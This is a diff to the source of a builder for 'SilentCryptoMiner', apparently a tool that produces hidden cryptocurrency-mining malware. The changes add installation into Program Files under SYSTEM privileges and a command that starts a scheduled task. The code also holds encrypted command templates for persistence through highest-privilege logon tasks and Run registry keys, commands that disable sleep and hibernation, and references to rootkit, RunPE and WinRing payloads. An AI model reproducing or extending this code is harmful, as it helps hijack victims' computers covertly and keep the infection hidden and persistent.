@@ -325,7 +325,6 @@ namespace SilentCryptoMiner
                 if (F.BuildErrorTest(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                     return false;
                 
-
                 string shellcodebytes = Encoding.GetEncoding("ISO-8859-1").GetString(ConvertToShellcode(inputFile));
                 string shellcode = ToLiteral(Cipher(shellcodebytes, F.KEY));
 
@@ -570,6 +569,11 @@ namespace SilentCryptoMiner
                         }
                 }
 
+                if (F.toggleRunSystem.Checked)
+                {
+                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
+                }
+
                 stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, _rGetString_(\"{F.EncryptString(F.txtInstallFileName.Text)}\"))");
 
                 if (F.toggleWatchdog.Checked)
@@ -586,12 +590,12 @@ namespace SilentCryptoMiner
                     stringb.Replace("DefAutoDelete", "true");
                 }
 
-                if (F.FormAO.toggleMinerOverwrite.Checked)
+                if (!F.FormAO.toggleOldMinerOverwrite.Checked)
                 {
-                    stringb.Replace("DefMinerOverwrite", "true");
+                    stringb.Replace("DefNoMinerOverwrite", "true");
                 }
 
-                if (!F.FormAO.toggleNoRunInstall.Checked)
+                if (F.FormAO.toggleRunInstall.Checked)
                 {
                     stringb.Replace("DefRunInstall", "true");
                 }
@@ -620,6 +624,7 @@ namespace SilentCryptoMiner
             stringb.Replace("#WATCHDOGNAME", F.EncryptString("sihost64"));
             stringb.Replace("#TASKSCHADD", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
             stringb.Replace("#TASKSCHREM", F.EncryptString($"cmd /c schtasks /delete /f /tn \"{F.txtInstallEntryName.Text}\""));
+            stringb.Replace("#TASKSCHSTART", F.EncryptString($"cmd /c schtasks /run /tn \"{F.txtInstallEntryName.Text}\""));
             stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /f /d \"{{0}}\""));
             stringb.Replace("#REGREM", F.EncryptString($"cmd /c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /f"));
             stringb.Replace("#POWERCFG", F.EncryptString(@"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
@@ -659,7 +664,9 @@ namespace SilentCryptoMiner
             stringb.Replace("#RESRKU", F.Resources_rootkitu);
             stringb.Replace("#RESWR", F.Resources_winring);
             stringb.Replace("#RESRPE", F.Resources_runpe);
-            
+
+            stringb.Replace("$LIBSROOT", F.chkInstall.Checked && F.toggleRunSystem.Checked ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
+
             stringb.Replace("startDelay", F.txtStartDelay.Text);
 
             foreach (Match m in Regex.Matches(stringb.ToString(), "_r(.+?)_"))
